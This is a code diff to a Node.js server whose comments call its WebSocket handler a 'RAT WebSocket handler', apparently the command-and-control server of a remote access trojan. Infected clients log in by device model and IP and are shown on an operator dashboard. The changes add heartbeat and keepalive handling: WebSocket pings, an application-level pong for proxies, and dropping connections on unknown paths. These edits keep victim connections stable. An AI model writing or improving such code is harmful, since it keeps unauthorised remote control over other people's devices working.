@@ -21,6 +21,8 @@ server.on('upgrade', (request, socket, head) => {
         wss.handleUpgrade(request, socket, head, (ws) => {
             wss.emit('connection', ws, request);
         });
+    } else if (!pathname.startsWith('/socket.io')) {
+        socket.destroy();
     }
     // socket.io handles its own /socket.io/ upgrades internally
 });
@@ -58,6 +60,9 @@ let stats = {
 // RAT WebSocket handler (replaces TCP listener)
 // ═══════════════════════════════════════════════════
 wss.on('connection', (ws, req) => {
+    ws.isAlive = true;
+    ws.on('pong', () => { ws.isAlive = true; });
+
     let clientId = null;
     const remoteIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
 
@@ -73,6 +78,12 @@ wss.on('connection', (ws, req) => {
             if (!msg) continue;
             try {
                 const json = JSON.parse(msg);
+
+                // Application-level pong for proxies that strip WS frames
+                if (json.type === 'pong') {
+                    ws.isAlive = true;
+                    continue;
+                }
 
                 if (json.type === 'login') {
                     clientId = `${json.model}_${remoteIp.replace(/[:.]/g, '_')}`;
@@ -221,13 +232,10 @@ setInterval(() => {
         if (ws.isAlive === false) return ws.terminate();
         ws.isAlive = false;
         ws.ping();
+        try { ws.send(JSON.stringify({ type: 'ping' })); } catch (e) {}
     });
 }, 30000);
 
-wss.on('connection', (ws) => {
-    ws.isAlive = true;
-    ws.on('pong', () => { ws.isAlive = true; });
-});
 
 // ═══════════════════════════════════════════════════
 // Dashboard socket.io handler
